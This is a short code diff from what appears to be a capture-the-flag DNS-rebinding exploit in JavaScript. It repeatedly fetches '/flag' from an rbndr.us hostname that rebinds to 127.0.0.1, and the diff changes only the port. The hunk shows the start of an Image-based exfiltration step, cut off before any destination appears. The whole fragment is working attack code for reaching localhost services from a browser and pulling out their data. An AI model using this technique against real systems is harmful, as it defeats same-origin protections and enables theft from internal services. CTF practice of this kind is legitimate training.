@@ -7,7 +7,7 @@ const target = 'acd918ee.7f000001.rbndr.us';
 // Very aggressive - many rapid attempts
 for (let i = 1; i <= 200; i++) {
     setTimeout(() => {
-        fetch(`http://${target}/flag`)
+        fetch(`http://${target}:80/flag`)
             .then(r => r.text())
             .then(flag => {
                 const img = new Image();
